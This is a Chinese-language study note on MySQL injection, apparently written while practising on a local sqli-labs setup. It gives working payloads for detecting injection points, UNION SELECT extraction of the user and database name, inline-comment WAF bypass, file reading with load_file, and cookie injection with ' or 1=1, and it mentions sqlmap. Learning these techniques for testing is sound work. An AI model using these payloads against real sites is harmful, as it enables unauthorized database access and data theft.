### 1. MySQL注入知识点

```sql
select user(); -- 查看当前MySQL登录用户名
select database(); -- 当前使用MySQL数据库名
select version(); -- MySQL版本
select * from admin limit 2,3; -- 从第二行开始查出三条结果
三种注释：--空格 或 # 或 /**/

/*内联注释*/
/*! SQL语句 */ 只有MySQL可以识别，常用来绕过WAF
select * from article where id = id
-- 下面这条语句执行到id=-1时会报错，然后执行后面的内联语句；使用注释来进行关键字的包含，所以后面的语句可以被MySQL执行
select * from article where id = -1 /*!union*//*!select*/ 1,2,3,4 

空格 可以改成 %20
```

### 2. SQL注入分类

根据注入位置数据类型可将SQL注入分为：数字型、字符型

### 3. GET基于报错的SQL注入

通过在URL中修改对应的ID值，为正常数字、大数字、字符（单引号、双引号、双单引号、括号）、反斜杠来探测URL中是否存在注入点。

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/JVM/20201007161921.png)

```sql
## 假如SQL语句如下
select login_name, password from admin where id = ('ID') LIMIT 0, 1;
## 构造URL如下（那个➕可以注释掉后面的SQL）
192.168.1.106/sql/less-3/?id=1') --+
```

### 4. GET基于报错的SQL注入利用

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/JVM/20201007163424.png)

```sql
## 正常URL请求
http://192.168.1.106/sql/less/?id=1

-- 1.利用order by判断字段数(通过增大order by后面的数字来猜测有几个字段)
http://192.168.1.106/sql/less/?id=1' order by 3--+

-- 2.利用union select联合查询，获取表名
首先通过第一步知道有3个字段，那么你就可以通过如下联合查询知道是第几个字段：
http://192.168.1.106/sql/less/?id=-1' UNION SELECT 1,2,3--+

http://192.168.1.106/sql/less/?id=-1' UNION SELECT 1,user(),database()--+
```

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/JVM/20201007171150.png)

### 5. 利用SQLmap进行SQL注入漏洞利用

不需要自己组织SQL语句来注入

### 6. 利用MySQL注入读写文件

读取前提：

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201007174022.png)

利用MySQL读取磁盘上的某个文件的内容：

```mysql
select load_file('/User/liuwentao/Desktop/test.txt')
```

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201007174315.png)

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201007174816.png)

写文件：

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201008092933.png)

### 7. Cookie注入

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201008093813.png)

利用`' or 1=1 --+`注入

自己写比较繁琐，所以利用SQLmap进行注入：

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201008094516.png)

![](https://winterliublog.oss-cn-beijing.aliyuncs.com/winterliu-notes/security/20201008094748.png)

### 8. 总结

无论什么注入都是需要可以进行输入的，用户可以进行修改，然后输入的值会被传递到服务器，并作为SQL语句执行。

